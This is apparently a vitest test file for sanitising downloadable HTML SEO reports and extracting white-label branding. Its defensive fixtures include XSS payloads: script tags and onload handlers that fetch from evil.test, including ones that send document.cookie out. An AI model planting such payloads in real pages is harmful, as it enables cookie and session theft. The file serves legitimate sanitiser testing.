import { describe, expect, it } from "vitest";
import {
  extractAccent,
  extractByline,
  printableDocument,
  printableFilename,
  whiteLabelFor,
} from "./printableReport";
import { REPORT_CSP } from "@/shared/report-sandbox";

/**
 * The download artefact, and the white-label identity read out of the document.
 *
 * ## Why the branding is extracted rather than stored
 *
 * There is **no accent, logo or client-name column** in the reports schema. The
 * only white-labelling in this system lives inside the stored HTML: the
 * \`--accent\` custom property, which the seo-report skill calls *"the one token a
 * report template may change"*, and the \`.byline\`. So these functions are the
 * only place that can answer "whose report is this?", and they have to be right
 * about a document the model wrote from attacker-influenceable inputs.
 */

/** The document as the seo-report skill emits it, with a template's accent. */
const TEMPLATED = `<!doctype html>
<html><head><style>
:root{--bg:#fff;--fg:#0a0a0a;--accent:#1C4ED8}
body{background:var(--bg);color:var(--fg)}
</style></head>
<body><div class="shell">
<header><h1>GEO audit</h1><p class="byline">Prepared for <strong>Northwind</strong></p></header>
</div></body></html>`;

/** The same document with no template, so the accent is the default. */
const UNTEMPLATED = `<!doctype html>
<html><head><style>
:root{--bg:#fff;--fg:#0a0a0a;--accent:var(--fg)}
body{background:var(--bg)}
</style></head><body><div class="shell"><h1>GEO audit</h1></div></body></html>`;

describe("extractAccent", () => {
  it("reads the brand colour a template set", () => {
    expect(extractAccent(TEMPLATED)).toBe("#1C4ED8");
  });

  it("reports no accent for the default, which is a variable reference", () => {
    // **`var(--fg)` is not a brand colour** — it resolves to the text colour.
    // Reporting it would claim an identity the document does not have, which is
    // the same mistake as reading a byline that is not there.
    expect(extractAccent(UNTEMPLATED)).toBeNull();
  });

  it("reports no accent when the document declares none", () => {
    expect(extractAccent("<html><body>no stylesheet</body></html>")).toBeNull();
  });

  it("refuses a value that is not a hex colour", () => {
    // **This string reaches a filename and a header.** A keyword, a `url()` or an
    // over-long token is either a broken template or an attempt at one, and both
    // should read as "no accent" rather than be passed through.
    for (const hostile of [
      '--accent:red;background:url("http://evil.test")',
      "--accent:var(--fg)",
      // A hex prefix followed by more of the token: `#1C4ED8x` is not a colour.
      "--accent:#1C4ED8x",
    ]) {
      expect(extractAccent(`<style>:root{${hostile}}</style>`)).toBeNull();
    }
  });

  it("reads the colour out of a declaration that closes after it", () => {
    // **A real report writes `--accent:#1C4ED8}`** — the `}` is the declaration's
    // own delimiter. An earlier guard rejected it, so a valid brand colour read as
    // no brand colour at all: the same failure shape as an under-quoting price,
    // where the cautious answer is silence rather than a wrong number.
    expect(extractAccent(`<style>:root{--accent:#1C4ED8}</style>`)).toBe(
      "#1C4ED8",
    );
    expect(
      extractAccent(`<style>:root{--accent:#1C4ED8;--fg:#0a0a0a}</style>`),
    ).toBe("#1C4ED8");
  });

  it("does not let a hostile tail change the colour it reports", () => {
    // The capture is the **token**, not a prefix, so the injection after the `;`
    // is never part of the value. That is what the pattern's lookahead buys.
    const injected = extractAccent(
      `<style>:root{--accent:#1C4ED8;}</style><script>alert(1)</script><style>{--x:`,
    );
    expect(injected).toBe("#1C4ED8");
    expect(injected).not.toContain("script");
  });

  it("accepts a three-digit hex, which templates do write", () => {
    expect(extractAccent("<style>:root{--accent:#1C4}</style>")).toBe("#1C4");
  });
});

describe("extractByline", () => {
  it("reads the byline as text, with markup stripped", () => {
    expect(extractByline(TEMPLATED)).toBe("Prepared for Northwind");
  });

  it("reads past nested markup to the element's own close", () => {
    // **`[\s\S]*?</` closes on the first tag**, so "Prepared for <strong>Northwind
    // </strong>" used to read as just "Prepared for" — the client's name, the one
    // thing a white-labelled byline exists to carry, silently dropped. The pattern
    // matches the tag name back, so it closes on *this* element.
    expect(
      extractByline('<p class="byline">See <em>also</em> Northwind</p>'),
    ).toBe("See also Northwind");
    expect(extractByline('<div class="byline">A<span>b</span>c</div>')).toBe(
      "A b c",
    );
  });

  it("does not claim to nest the same element inside itself", () => {
    // **The pattern counts closing tags, not nesting depth.** A `<div class="byline">`
    // containing another `div` closes at the inner `</div>`, so this returns "A b"
    // rather than "A b c".
    //
    // That limit is deliberate and not worth a parser: the seo-report skill
    // defines the byline as one line — *"the byline (for example `Prepared for
    // NAME`)"* — so a byline containing a same-name child is a malformed document,
    // and a parser for that case would be cost without a caller. **The behaviour
    // is pinned here so it cannot change silently.**
    expect(extractByline('<div class="byline">A<div>b</div>c</div>')).toBe(
      "A b",
    );
  });

  it("matches the byline among several classes", () => {
    expect(extractByline('<p class="lead byline">Hi</p>')).toBe("Hi");
  });

  it("decodes the entities a byline realistically contains", () => {
    // An agency's client name is the likeliest place for an ampersand or an
    // apostrophe, and a filename full of `&amp;` is not a deliverable.
    const html =
      '<p class="byline">Prepared for Smith &amp; Jones&#39;s client</p>';
    expect(extractByline(html)).toBe("Prepared for Smith & Jones's client");
  });

  it("reports no byline when the element is empty", () => {
    // An empty byline is not a byline, and a filename starting "-" is a filename
    // the shell reads as a flag.
    expect(extractByline('<p class="byline">   </p>')).toBeNull();
  });

  it("reports no byline when the document has none", () => {
    expect(extractByline(UNTEMPLATED)).toBeNull();
  });

  it("does not match a class that merely contains the word", () => {
    // `\b` on both sides: `byline-note` is a different element.
    expect(extractByline('<p class="byline-note">x</p>')).toBeNull();
  });
});

describe("printableFilename", () => {
  it("names the file after the report, because the client receives it", () => {
    expect(printableFilename("GEO audit — Northwind", "r1")).toBe(
      "GEO-audit-Northwind.html",
    );
  });

  it("transliterates accents rather than dropping the letters", () => {
    // NFKD then drop combining marks, so "é" becomes "e" and not nothing.
    expect(printableFilename("Rapport d'audit", "r1")).toBe(
      "Rapport-d-audit.html",
    );
  });

  it("falls back to the id when the title cannot make a filename", () => {
    // A download with no name is worse than one with an ugly name.
    expect(printableFilename("///", "r1")).toBe("report-r1.html");
    expect(printableFilename("", "r1")).toBe("report-r1.html");
  });

  it("never produces a name the shell would read as a flag", () => {
    expect(printableFilename("-rf", "r1").startsWith("-")).toBe(false);
    expect(printableFilename("...", "r1")).toBe("report-r1.html");
  });

  it("bounds the length so the name survives every filesystem's limit", () => {
    expect(printableFilename("x".repeat(400), "r1").length).toBeLessThanOrEqual(
      80 + ".html".length,
    );
  });
});

describe("printableDocument", () => {
  it("serves the document as an attachment, which is what makes it a file", async () => {
    const response = printableDocument(UNTEMPLATED, "GEO audit", "r1");

    expect(response.headers.get("Content-Disposition")).toContain("attachment");
    expect(response.headers.get("Content-Disposition")).toContain(
      'filename="GEO-audit.html"',
    );
  });

  it("carries both filename forms, so a non-ASCII title is not truncated", async () => {
    // `Content-Disposition` is latin-1: without `filename*`, "Rapport d'audit"
    // arrives as mojibake in the download name.
    const response = printableDocument(UNTEMPLATED, "Rapport d'audit", "r1");
    const header = response.headers.get("Content-Disposition") ?? "";

    expect(header).toContain("filename*=UTF-8''");
    expect(header).toContain(encodeURIComponent("Rapport-d-audit.html"));
  });

  it("sends the locked-down policy, because the file has no script", async () => {
    const response = printableDocument(TEMPLATED, "t", "r1");
    const csp = response.headers.get("Content-Security-Policy") ?? "";

    // **Not the print policy.** The saved document is inert — every script is
    // stripped — so `allow-scripts` here would authorise a script that is not
    // there, and would be the one place the download is permissive if the
    // stripping ever regressed.
    expect(csp).toBe(REPORT_CSP);
    expect(csp).not.toContain("allow-scripts");
    // The report's own styles are allowed to be inline — `style-src
    // 'unsafe-inline'` is in the base policy — but no script source is.
    expect(csp).not.toContain("script-src");
  });

  it("carries no script at all, because a download is never rendered", async () => {
    const body = await printableDocument(TEMPLATED, "t", "r1").text();

    // **CodeRabbit's finding, and the assertion that now pins the fix.** A download
    // is not rendered, so a `print()` call in the saved file could never fire — it
    // was dead code in the artefact and a live risk in it, because a file opened
    // from disk arrives with no CSP to stop a script the report's own author wrote.
    expect(body).not.toContain("<script");
    expect(body).not.toContain("print()");
  });

  it("strips a script the report wrote for itself", async () => {
    // The threat model: report HTML is written by a model from crawled pages, SERP
    // titles and GSC queries — all attacker-influenceable. A client opening the
    // file is executing whatever was in it.
    const hostile = TEMPLATED.replace(
      "</body>",
      '<script src="https://evil.test/x.js"></script></body>',
    );

    const body = await printableDocument(hostile, "t", "r1").text();

    expect(body).not.toContain("evil.test");
    expect(body).not.toContain("<script");
  });

  it("strips a properly closed script, which only the first rule can stop", async () => {
    // **The unterminated rule would pass this test too**, because
    // `/<script\b[\s\S]*?$/` swallows everything from the tag to the end of the
    // document. So this case is what makes the *closed* rule independently
    // necessary — and the reason both rules exist rather than one covering for the
    // other.
    const hostile = TEMPLATED.replace(
      "</body>",
      '<script>fetch("https://evil.test/a")</script><p>after</p></body>',
    );

    const body = await printableDocument(hostile, "t", "r1").text();

    expect(body).not.toContain("evil.test");
    expect(body).not.toContain("<script");
    // The content *after* the script has to survive, or stripping has become
    // deleting the report.
    expect(body).toContain("after");
  });

  it("strips a single-quoted inline handler as well as a double-quoted one", async () => {
    // The rule existed and was never exercised, so a mutation removing it changed
    // nothing. Both quoting styles are real: a model writing HTML writes either.
    const hostile = TEMPLATED.replace(
      "<body>",
      // **A real single-quoted attribute**, not an escaped one: the rule matches
      // `'[^']*'`, so the fixture has to contain an actual apostrophe-delimited
      // value or the test would pass for the wrong reason.
      `<body onload='fetch("https://evil.test/?c="+document.cookie)'>`,
    );

    const body = await printableDocument(hostile, "t", "r1").text();

    expect(body).not.toContain("onload");
    expect(body).not.toContain("evil.test");
  });

  it("strips an inline handler, which runs without a script element", async () => {
    // `<script>` removal alone would leave this, and it executes on click.
    const hostile = TEMPLATED.replace(
      "<body>",
      `<body onload="fetch('https://evil.test/?c='+document.cookie)">`,
    );

    const body = await printableDocument(hostile, "t", "r1").text();

    expect(body).not.toContain("onload");
    expect(body).not.toContain("evil.test");
  });

  it("strips an unterminated script, the shape a truncated document ends in", async () => {
    const truncated =
      '<html><head></head><body><p>partial</p><script src="https://evil.test/x.js"';

    const body = await printableDocument(truncated, "t", "r1").text();

    expect(body).not.toContain("evil.test");
  });

  it("carries a policy inside the file, because a header does not travel with it", async () => {
    const body = await printableDocument(TEMPLATED, "t", "r1").text();

    // **A `meta` CSP applies only to what follows it**, so it has to be first in
    // `<head>` — a document whose first element is a script would have run it
    // before the browser read the policy.
    const head = /<head[^>]*>([\s\S]*?)<\/head>/i.exec(body)?.[1] ?? "";
    expect(head.trimStart().startsWith("<meta http-equiv=")).toBe(true);
    expect(head).toContain("Content-Security-Policy");
    // The locked-down policy, not the print one: this document has no script to
    // authorise, so `allow-scripts` would be granting nothing on purpose.
    expect(head).not.toContain("allow-scripts");
  });

  it("puts the policy ahead of anything when the document has no head", async () => {
    const headless = "<html><body><p>bare</p></body></html>";

    const body = await printableDocument(headless, "t", "r1").text();

    expect(body).toContain("<head><meta http-equiv=");
    // Before the body, so nothing can precede the policy.
    expect(body.indexOf("<meta http-equiv=")).toBeLessThan(
      body.indexOf("<body"),
    );
  });

  it("never caches a document carrying a client's findings", async () => {
    const response = printableDocument(TEMPLATED, "t", "r1");
    expect(response.headers.get("Cache-Control")).toBe("private, no-store");
  });

  it("serves the stored HTML unchanged apart from the script", async () => {
    // **Re-serialising it would be the one change that could make the download
    // differ from what prints**, which is the whole reason the artefact is the
    // document rather than a rendering of it.
    const original = TEMPLATED.replace("</body>", "</body>");
    const body = await printableDocument(original, "t", "r1").text();

    expect(body).toContain(":root{--bg:#fff;--fg:#0a0a0a;--accent:#1C4ED8}");
    expect(body).toContain(
      '<p class="byline">Prepared for <strong>Northwind</strong></p>',
    );
  });
});

/**
 * The white-label seam.
 *
 * **These exist because a mutation survived.** Replacing the hex-colour guard in
 * `extractAccent` with a no-op left every other test green, because the only
 * assertions were on that private return value — nothing downstream could observe
 * the decision. **A rule with nowhere to be observed is the most expensive kind of
 * missing test**, and the fix is a shape a caller consumes, not another assertion
 * on a private function.
 */
describe("whiteLabelFor", () => {
  it("carries the template's identity out of the document", () => {
    expect(whiteLabelFor(TEMPLATED)).toEqual({
      accent: "#1C4ED8",
      byline: "Prepared for Northwind",
    });
  });

  it("reports no identity for a document with no template", () => {
    // **null means untemplated, which is an answer and not an absence.** A report
    // written with no template must export as OpenGEO's own document rather than
    // one claiming an accent it does not have.
    expect(whiteLabelFor(UNTEMPLATED)).toBeNull();
  });

  it("refuses an accent that is not a hex colour", () => {
    // The whole document, not a bare declaration: this is the path a caller takes,
    // and the one a mutation to the guard would have to survive.
    for (const hostile of [
      '--accent:red;background:url("http://evil.test")',
      "--accent:var(--fg)",
      "--accent:#1C4ED8x",
    ]) {
      expect(
        whiteLabelFor(
          `<style>:root{${hostile}}</style><p class="byline">X</p>`,
        ),
      ).toBeNull();
    }
  });

  it("drops the whole identity when the accent is hostile", () => {
    // **A hostile accent must not leave a half-trusted identity.** Returning the
    // byline with no accent would export a document that carries the client's name
    // and nothing else, which is neither the template's brand nor untemplated.
    expect(
      whiteLabelFor(
        "<style>:root{--accent:url(javascript:alert(1))}</style>" +
          '<p class="byline">Northwind</p>',
      ),
    ).toBeNull();
  });

  it("keeps a byline-less template's identity rather than dropping it", () => {
    // A template that sets an accent and no byline is still white-labelled; the
    // accent is the brand, the byline is the recipient.
    const html = "<style>:root{--accent:#1C4ED8}</style><h1>Audit</h1>";
    expect(whiteLabelFor(html)).toEqual({
      accent: "#1C4ED8",
      byline: null,
    });
  });
});
